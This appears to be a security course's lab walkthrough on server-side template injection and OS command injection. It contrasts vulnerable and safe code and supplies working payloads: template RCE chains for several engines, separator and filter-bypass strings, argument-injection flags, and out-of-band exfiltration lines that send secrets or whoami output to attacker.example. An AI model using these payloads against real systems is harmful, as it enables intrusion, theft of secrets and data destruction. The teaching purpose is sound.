# Week 07: Attack walkthrough - SSTI & Command Injection

> ⚠️ **Lab only.**

---

## Part 1: Server-Side Template Injection

### The pattern

A template engine evaluates expressions at render time. When **user input is concatenated into the template string** (rather than passed as data to the template), the user controls the expression:

```python
# vulnerable
def render_greeting(name):
    template = f"Hello, {name}!"
    return env.from_string(template).render()

# safe (the right pattern)
def render_greeting(name):
    return env.from_string("Hello, {{ name }}!").render(name=name)
```

In the vulnerable case, if `name` is `{{7*7}}`, the rendered output is `Hello, 49!`. The template engine evaluated `7*7`.

That's SSTI. Once you can evaluate arbitrary expressions in the template's language, you typically have RCE.

### Step 0: Detect SSTI

The **math test** (works for almost every engine):

```
{{7*7}}      → 49 ?       → Jinja2, Twig
${7*7}       → 49 ?       → Velocity, Freemarker, JS template literals
*{7*7}       → 49 ?       → Thymeleaf (some configs)
#{7*7}       → 49 ?       → Smarty
<%= 7*7 %>   → 49 ?       → ERB (Ruby)
```

If the response contains `49`, you've confirmed SSTI **and** identified the engine.

If you get `7*7` echoed literally, the field is HTML-escaped - no SSTI. (Note: HTML escaping doesn't prevent SSTI because the evaluation happens *before* HTML escaping. If you see `49`, the engine ran.)

### Step 1: Identify the engine precisely

Different engines have different escape hatches. Probe with engine-specific syntax:

| Engine | Telling probe | Response |
|---|---|---|
| Jinja2 | `{{ 'a'.upper() }}` | `A` |
| Twig | `{{ {1,2,3} | length }}` | `3` |
| Velocity | `#set($x = 7*7) ${x}` | `49` |
| Freemarker | `<#assign x=7*7>${x}` | `49` |
| ERB | `<%= 7*7 %>` | `49` |
| Smarty | `{$smarty.version}` | version string |

Once you've identified the engine, look up its known RCE chain.

### Step 2: Jinja2 RCE chain - the canonical one

Jinja2's sandboxing is famously weak. The standard chain walks the Python object graph from any string to `subprocess`:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Breakdown:

- `''.__class__` → `<class 'str'>`
- `.__mro__` → method resolution order (the inheritance chain)
- `.__mro__[1]` → `<class 'object'>` (the base of everything in Python)
- `.__subclasses__()` → **every class loaded in the interpreter** - a list of hundreds of classes

Find a useful class in that list (in a real lab you'd enumerate; common targets are `subprocess.Popen` or `os._wrap_close`). Then call it:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[POPEN_INDEX]('id', shell=True, stdout=-1).communicate()[0] }}
```

For lab work, PayloadsAllTheThings has ready-to-go variants. The PortSwigger "Basic SSTI" lab is the gentlest practice.

### Step 3: When `__class__` is filtered

A common defense is to blacklist `__class__`. Bypasses:

```jinja
{{ ''['__cl'+'ass__'] }}                              ← string concat in lookup
{{ ''|attr('__class__') }}                            ← Jinja2 attr filter
{{ request|attr(['__','class','__']|join) }}          ← list join then attr
```

The pattern: any string filter exists to make the dangerous attribute name unreachable. Find a way to *construct* the string at runtime that doesn't match the filter's static check.

### Step 4: SSTI in other engines

#### Twig (PHP)

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

Twig's `_self` exposes the environment; the environment lets you register `exec` as a filter, then call it.

#### Velocity (Java)

```
#set($x = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$x.inputStream
```

Velocity's `$class` reflection-style hook gives access to any Java class.

#### Freemarker (Java)

```
<#assign x="freemarker.template.utility.Execute"?new()>
${ x("id") }
```

Freemarker's `?new()` instantiates classes by name; `freemarker.template.utility.Execute` runs shell commands.

#### ERB (Ruby)

```erb
<%= `id` %>
```

ERB allows backticks (Ruby's shell-execution syntax) by default. One character to RCE.

### Step 5: Blind SSTI

When the page doesn't echo back the rendered output (e.g., it's used in an email subject line), test for SSTI blind:

```
{{ requests.get('http://attacker.example/'+config.SECRET_KEY) }}
```

The server makes an outbound request to your collector. If the request hits, SSTI confirmed, and the URL contains the leaked data.

Or time-based:

```
{{ ''.__class__.__mro__[1].__subclasses__()[POPEN]('sleep 5', shell=True).wait() }}
```

If the response takes 5 seconds, SSTI is exploitable.

## Part 2: Command Injection

### The pattern

User input is concatenated into a shell command:

```python
# vulnerable
def ping(host):
    return subprocess.check_output(f"ping -c 1 {host}", shell=True)

# safe
def ping(host):
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        raise BadHost
    return subprocess.check_output(["ping", "-c", "1", host])
```

When the user input contains a shell metacharacter, the shell interprets it:

```
host = "8.8.8.8; cat /etc/passwd"
shell sees: ping -c 1 8.8.8.8; cat /etc/passwd
```

The semicolon separates two commands. Both run. The shell injection landed.

### Step 0: Find a command-shaped input

Look for parameters that *probably* feed a shell:

- `?host=`, `?domain=` (anything that suggests a network tool)
- `?file=`, `?path=` (anything that could be passed to `tar`, `gzip`, `convert`)
- `?command=` (yes, real apps do this)
- File-conversion features (uploads → ImageMagick → `magick convert ...`)
- Anything that mentions external tools (ffmpeg, ImageMagick, exiftool, Ghostscript)

### Step 1: Inject metacharacters

Try each separator and see what comes back:

```
?host=8.8.8.8; id
?host=8.8.8.8 && id
?host=8.8.8.8 | id
?host=8.8.8.8 `id`
?host=8.8.8.8$(id)
?host=8.8.8.8 %0a id          ← newline (URL-encoded)
?host=8.8.8.8 %0d id          ← carriage return
```

If any of these appends the output of `id` to the response (or otherwise behaves differently), you've found injection.

### Step 2: Blind command injection

The response doesn't change. Use one of the same patterns as blind SQLi:

#### Time-based

```
?host=8.8.8.8 ; sleep 10
?host=8.8.8.8 && sleep 10
```

A 10-second delay confirms execution.

#### Out-of-band

```
?host=8.8.8.8 ; curl http://attacker.example/$(whoami)
?host=8.8.8.8 ; nslookup $(whoami).attacker.example
```

If your collaborator gets a request whose subdomain contains the whoami output, you've got both confirmation and your first piece of exfil data.

The PortSwigger "Blind OS command injection with time delays" lab is the canonical drill.

### Step 3: Argument injection (the subtle one)

When a developer correctly uses `subprocess.run(["tool", user_input])` - splitting args, no shell - they might *think* they're safe. Sometimes they're not.

If `user_input` starts with `-`, it's an option to the tool:

```python
subprocess.run(["curl", user_input])
```

`user_input = "--output /tmp/owned"` → curl writes to `/tmp/owned`.

Real examples:

| Tool | Dangerous flag |
|---|---|
| `curl` | `--output FILE`, `--upload-file FILE`, `--config FILE` (reads commands!) |
| `wget` | `--output-document FILE`, `--use-askpass=COMMAND` (runs command!) |
| `ssh` | `-oProxyCommand=COMMAND` (runs command!) |
| `git clone` | `--upload-pack=COMMAND` (runs command!) |
| `find` | `-exec COMMAND` |
| `tar` | `--use-compress-program=COMMAND` (runs command!) |
| `rsync` | `-e COMMAND` |

Defense: pass `--` before user input where supported, validate that input doesn't start with `-`, or use the tool's API rather than the CLI.

### Step 4: Combining argument injection with file reads

```python
subprocess.run(["zip", user_zipname, "data.txt"])
```

`user_zipname = "@/etc/passwd"` → some versions of `zip` read the file list from the file you name with `@`. You just dumped passwd into a zip the attacker downloads.

This is the class of bugs that's "I used a list, so I'm safe" - wrong. The list separated args, but each arg is still attacker-controlled and can carry tool-specific behavior.

### Step 5: Command injection via filename

Even when the user input goes to a filesystem operation, not a shell, a clever filename can trigger injection downstream:

```python
# upload handler
filename = request.files["upload"].filename
storage.put(f"uploads/{filename}", request.files["upload"].read())

# later, a worker processes the file
subprocess.run(f"convert uploads/{filename} thumbs/thumb.jpg", shell=True)
```

If `filename = "x.png; rm -rf /"`, the storage handler accepts it, the worker concatenates it. Injection at a different stage from the input. **Sanitize at the boundary - never trust the filename later.**

### Step 6: Filter bypasses

If the app strips spaces:

```
{IFS} → bash internal field separator
${IFS}
$IFS$9
<                ← input redirect
```

Example:

```
?host=8.8.8.8;{cat,/etc/passwd}
?host=8.8.8.8;cat${IFS}/etc/passwd
?host=8.8.8.8;cat$IFS$9/etc/passwd
```

If the app strips slashes:

```
?host=8.8.8.8;cd${IFS}/;ls
```

`cd /` then `ls` reads the root without ever embedding a slash in the command.

If the app strips command names (e.g. blocks `cat`):

```
${PATH:0:1}                  → "/"
?host=8.8.8.8;\cat${IFS}/etc/passwd
```

Backslash + the command name slips past name-based filters.

The general principle: shell metacharacters and shell variable expansion give you a near-infinite encoding space. Filter bypasses are an arms race the defender will lose. Defense lives at a different layer (don't pass user input to a shell).

## Common mistakes when learning

- **Trying random characters and stopping when nothing happens.** Use the math test for SSTI and metacharacter probes for command injection systematically.
- **Forgetting `$()` and backticks for command injection.** Semicolon isn't the only separator.
- **Reading `__class__` filters as "secure."** Bypasses are routine.
- **Skipping argument injection.** Pure list-based subprocess calls can still be vulnerable if input starts with `-`.
- **Treating ImageMagick as "just an image tool."** It's executed code; user-controlled filenames go to it.

Now read [defense.md](defense.md).
